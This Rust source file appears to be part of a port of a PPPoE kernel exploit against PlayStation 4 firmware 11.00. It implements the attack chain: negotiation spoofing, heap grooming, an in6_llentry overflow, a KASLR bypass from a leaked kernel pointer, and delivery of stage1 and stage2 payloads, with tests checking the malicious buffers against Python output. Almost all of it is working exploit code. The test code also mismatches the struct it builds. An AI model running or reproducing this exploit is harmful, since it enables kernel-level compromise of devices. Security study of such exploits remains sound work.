// Import the constants module
use crate::constants;

// Import and re-export only what needs to be re exported.
mod exploit_state;
mod lcp_echo_handler;
mod negotiations;
mod offsets;
mod packet_checking;
mod packet_creation;
mod utils;
extern crate hwaddr;
extern crate packet;
extern crate pnet;
use exploit_state::{build_fake_lle, handle_icmpv6_router_sol, handle_padi};
use offsets::OFFSETS_FW_1100;
use packet_checking::{
    is_icmpv6_nd_ns, is_icmpv6_router_sol, is_lcp_conf_reject, is_lcp_conf_req, is_padi_packet,
};
use packet_creation::{
    create_icmpv6_echo_req, create_ipv4_packet, create_lcp_conf_request, create_lcp_term_req,
    create_padt_packet, create_udp_header,
};
use pnet::datalink::NetworkInterface;
use std::process;
use std::thread;
use std::time;
use utils::build_overflow_lle;
use utils::extract_pppoe_softc_list;
use utils::pin_to_cpu_0;
use utils::search_for_corrupted_obj;
use utils::{create_ethernet_channel, fragment, listen_for_packet, spray};

// Public re exports
pub use exploit_state::{build_fake_ifnet, ExploitState};
pub use lcp_echo_handler::LcpEchoHandler;
pub struct Exploit {
    pub exploit_state: ExploitState,
    pub stage1: Vec<u8>,
    pub stage2: Vec<u8>,
}

impl Exploit {
    pub fn capture_first_padi(&mut self, interface: &NetworkInterface) {
        let (mut _tx, mut rx) = create_ethernet_channel(interface).unwrap();
        println!("[+] Waiting for first PADI");
        let first_ignore_padi = listen_for_packet(rx.as_mut(), is_padi_packet);
        handle_padi(&mut self.exploit_state, &first_ignore_padi.unwrap());
    }

    pub fn ppp_negotiation(&mut self, interface: &NetworkInterface, ac_cookie: Option<Vec<u8>>) {
        negotiations::ppp_negotiation(interface, &mut self.exploit_state, ac_cookie);
    }

    pub fn lcp_negotiation(&mut self, interface: &NetworkInterface) {
        negotiations::lcp_negotiation(interface, &mut self.exploit_state);
    }

    pub fn ipcp_negotiation(&mut self, interface: &NetworkInterface) {
        negotiations::ipcp_negotiation(interface, &mut self.exploit_state);
    }

    pub fn heap_grooming(&mut self, interface: &NetworkInterface) {
        // Open channel
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        let result = listen_for_packet(rx.as_mut(), is_icmpv6_router_sol);
        handle_icmpv6_router_sol(&mut self.exploit_state, result.unwrap().as_slice());

        println!("[+] Target IPv6 {:?}", self.exploit_state.target_ipv6);
        // Enters grooming loop
        spray(
            tx.as_mut(),
            rx.as_mut(),
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            self.exploit_state.target_ipv6,
        );
        println!("\n[+] Heap grooming...done");
    }

    pub fn memory_corruption(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        pin_to_cpu_0(
            tx.as_mut(),
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
        );
        thread::sleep(time::Duration::from_secs(1));

        // Corrupt in6_llentry object
        let overflow_lle = build_overflow_lle(self.exploit_state.pppoe_softc);
        println!("[+] Sending malicious LCP configure request...");
        let mal_request = create_lcp_conf_request(
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            Some(overflow_lle),
        );
        let _result = tx
            .send_to(&mal_request, None)
            .expect("[-] Failed to send IPCP configure req packet");
        println!("[+] Waiting for LCP configure reject...");
        listen_for_packet(rx.as_mut(), is_lcp_conf_reject);
        // Re-negotiate after rejection
        self.lcp_negotiation(interface);
        self.ipcp_negotiation(interface);

        // Now search for the corrupted object
        let corrupted_source_ipv6: Option<[u8; 16]> = search_for_corrupted_obj(
            tx.as_mut(),
            rx.as_mut(),
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            self.exploit_state.target_ipv6,
        );

        match corrupted_source_ipv6 {
            Some(source_ipv6) => {
                println!(
                    "\n[+] Scanning for corrupted object...\nFound -> {:x?}",
                    source_ipv6
                );
                self.exploit_state.source_ipv6 = source_ipv6;
            }
            None => {
                println!("[-] Scanning for corrupted object...failed. Please retry the exploit.");
                process::exit(1);
            }
        }
    }

    pub fn defeat_kaslr(&mut self, interface: &NetworkInterface) {
        let (mut _tx, mut rx) = create_ethernet_channel(interface).unwrap();
        // Declare packet outside the loop
        let mut packet = Vec::new();
        // Keep listening until we get a packet with the desired length
        loop {
            packet = listen_for_packet(rx.as_mut(), is_icmpv6_nd_ns).unwrap();
            if packet.len() >= 89 {
                //TODO change
                break;
            }
        }
        // Extract the ICMPv6 payload and parse the relevant field
        if let Some(pppoe_softc_list) = extract_pppoe_softc_list(&packet) {
            println!("[+] pppoe_softc_list: {:#x}", pppoe_softc_list);

            // Calculate the KASLR offset
            let kaslr_offset = pppoe_softc_list.wrapping_sub(OFFSETS_FW_1100.pppoe_softc_list);
            println!("[+] kaslr_offset: {:#x}", kaslr_offset);
            self.exploit_state.kaslr_offset = kaslr_offset;

            // Validate the leak based on address comparison
            if (pppoe_softc_list & 0xffffffff00000fff)
                != (OFFSETS_FW_1100.pppoe_softc_list & 0xffffffff00000fff)
            {
                println!("[-] Error leak is invalid. Wrong firmware?");
                process::exit(1);
            }
        } else {
            println!("[-] Failed to extract pppoe_softc_list");
            process::exit(1);
        }
    }

    pub fn remote_code_exec(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();
        let lcp_term = create_lcp_term_req(
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            0,
        );
        let _result = tx
            .send_to(lcp_term.as_slice(), None)
            .expect("[-] Failed to send lcp term request");
        let fake_lle = build_fake_lle(&mut self.exploit_state, &self.stage1);
        self.ppp_negotiation(interface, Some(fake_lle));
        let icmpv6_echo_req = create_icmpv6_echo_req(
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            constants::SOURCE_IPV6,
            self.exploit_state.target_ipv6,
        );
        let _result = tx
            .send_to(icmpv6_echo_req.as_slice(), None)
            .expect("[-] Failed to icmpv6_echo_req request");
        println!("[+] Waiting for stage1 to resume...");
        let mut i = 0; // Wait for 3 lcp conf req
        while i < 3 {
            let _packet = listen_for_packet(rx.as_mut(), is_lcp_conf_req);
            i += 1;
        }
        // Send PADT
        let padt = create_padt_packet(
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            constants::PPPOE_SESSION_ID.to_le_bytes(),
        );
        println!("[+] Sending PADT...");
        let _result = tx
            .send_to(padt.as_slice(), None)
            .expect("[-] Failed to send padt");
    }

    pub fn frag_and_send(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut _rx) = create_ethernet_channel(interface).unwrap();
        let total_length: usize = self.stage2.len();
        let udp_header = create_udp_header(
            [0x00, 0x35], //TODO hardodce
            [0x23, 0x3c], // TODO
            total_length + 8,
        );
        let mut tobefrag = Vec::new();
        tobefrag.extend_from_slice(&udp_header);
        tobefrag.extend_from_slice(&self.stage2);

        let frags = fragment(tobefrag);
        for (i, frag) in frags.iter().enumerate() {
            let foff: usize = 128 * i;
            let is_last = i == frags.len() - 1;
            let current_udp_packet = create_ipv4_packet(
                constants::SOURCE_IPV4,
                constants::TARGET_IPV4,
                is_last, // true for the last fragment only
                frag.to_vec(),
                foff,
            );
            let mut ethernet_packet = Vec::new();
            //current_udp_packets
            ethernet_packet.extend(self.exploit_state.target_mac);
            ethernet_packet.extend(self.exploit_state.source_mac);
            ethernet_packet.extend(current_udp_packet);

            let _result = tx
                .send_to(ethernet_packet.as_slice(), None)
                .expect("[-] Failed to send etherpacket");
        }
    }
}

#[cfg(test)]
mod tests {

    use crate::exploit;

    use super::*;
    use pcap::Capture;

    fn get_test_ps4_mac() -> [u8; 6] {
        [0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]
    }

    fn get_test_host_mac() -> [u8; 6] {
        [0x07, 0x2c, 0xf6, 0x06, 0xba, 0x9b]
    }

    fn get_test_host_unique() -> [u8; 8] {
        [0x00, 0x2c, 0xf6, 0x06, 0xba, 0x9b, 0xff, 0xff]
    }

    #[test]
    fn test_extract_host_uniq() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_host_uniq(&packet) {
                    Ok(host_uniq) => {
                        println!("Extracted Host-Uniq: {:?}", host_uniq);
                        println!("Extracted Host-Uniq: {:?}", u64::from_be_bytes(host_uniq));
                        // Print the value as hexadecimal
                        println!(
                            "Converted value in hex: 0x{:016x}",
                            u64::from_be_bytes(host_uniq)
                        );

                        // Assert that the Host-Uniq value has the expected length
                        assert_eq!(host_uniq.len(), 8);
                        assert_eq!(u64::from_be_bytes(host_uniq), 0x002cf606ba9bffff)
                    }
                    Err(e) => {
                        panic!("Failed to extract Host-Uniq: {:?}", e);
                    }
                }
            }
        }
    }

    #[test]
    fn test_extract_source_mac() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_ps4_mac(&packet) {
                    Ok(source_mac) => {
                        println!("Extracted Source MAC Address: {:?}", source_mac);
                        // Assert that the MAC address has the expected length
                        assert_eq!(source_mac.len(), 6);
                        // Optionally, check the MAC address values
                        assert_eq!(&source_mac, &[0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]);
                    }
                    Err(e) => {
                        panic!("Failed to extract Source MAC Address: {:?}", e);
                    }
                }
            }
        }
    }

    use super::*;
    use std::fs::File;
    use std::io::Read;
    use std::io::Write;
    use std::io::{self};

    fn read_stage(file_path: &str) -> io::Result<Vec<u8>> {
        let mut file = File::open(file_path)?;
        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer)?;
        Ok(buffer) // Return the buffer
    }

    #[test]
    fn test_fake_ifnet_comparison() {
        // Generate fake ifnet using the Rust implementation
        let mut expl = Exploit {
            source_mac: [0; 6], // Using array initialization
            target_mac: [0; 6],
            pppoe_softc: 0,
            host_uniq: [0; 8],
            target_ipv6: [0; 16],
            source_ipv6: [0; 16],
            kaslr_offset: 0,
            stage1: vec![0],
            stage2: vec![0],
        };

        expl.pppoe_softc = 0x123456789ABCDEF0;
        let rust_fake_ifnet = expl.build_fake_ifnet();

        // Dump the fake ifnet to a file
        let mut rust_file =
            File::create("test_data/rust_fake_ifnet.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_ifnet)
            .expect("Failed to write to file");

        // Load the fake ifnet generated by Python
        let mut python_fake_ifnet = Vec::new();
        let mut python_file =
            File::open("test_data/fake_ifnet.bin").expect("Failed to open Python fake ifnet file");
        python_file
            .read_to_end(&mut python_fake_ifnet)
            .expect("Failed to read Python fake ifnet file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_ifnet.len(),
            python_fake_ifnet.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_fake_ifnet
            .iter()
            .zip(python_fake_ifnet.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_overflow_lle_comparison() {
        // Generate malicious LLE using the Rust implementation
        let pppoe_softc: u64 = 0xffffea374898a600; // Initial pppoe
        let rust_overflow_lle = build_overflow_lle(pppoe_softc);

        // Dump the malicious LLE to a file
        let mut rust_file =
            File::create("test_data/rust_overflow_lle.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_overflow_lle)
            .expect("Failed to write to file");

        // Load the malicious LLE generated by Python
        let mut python_overflow_lle = Vec::new();
        let mut python_file =
            File::open("test_data/overflow_lle.bin").expect("Failed to open Python LLE file");
        python_file
            .read_to_end(&mut python_overflow_lle)
            .expect("Failed to read Python LLE file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_overflow_lle.len(),
            python_overflow_lle.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_overflow_lle
            .iter()
            .zip(python_overflow_lle.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_fake_lle_comparison() {
        // Generate fake LLE using the Rust implementation
        let mut expl = Exploit {
            source_mac: [0; 6], // Using array initialization
            target_mac: [0; 6],
            pppoe_softc: 0,
            host_uniq: [0; 8],
            target_ipv6: [0; 16],
            source_ipv6: [0; 16],
            kaslr_offset: 0,
            stage1: vec![0],
            stage2: vec![0],
        };

        expl.kaslr_offset = 0x1eca4000;
        expl.stage1 = read_stage("stage1/stage1.bin").unwrap();
        expl.pppoe_softc = 0xffff9bba06f62c00;

        let rust_fake_lle = expl.build_fake_lle();

        // Dump the malicious LLE to a file
        let mut rust_file =
            File::create("test_data/rust_fake_lle.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_lle)
            .expect("Failed to write to file");

        // Load the malicious LLE generated by Python
        let mut python_fake_lle = Vec::new();
        let mut python_file =
            File::open("test_data/fake_lle.bin").expect("Failed to open Python LLE file");
        python_file
            .read_to_end(&mut python_fake_lle)
            .expect("Failed to read Python LLE file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_lle.len(),
            python_fake_lle.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in
            rust_fake_lle.iter().zip(python_fake_lle.iter()).enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_read_stage() {
        let stage2: Vec<u8> = read_stage("stage2/stage2.bin").unwrap();
        assert_eq!(stage2.len(), 2705);
    }

    #[test]
    fn test_fragment() {
        let stage2: Vec<u8> = read_stage("stage2/stage2.bin").unwrap();
        let frags = fragment(stage2);
        assert_eq!(frags.len(), 3);
    }
}
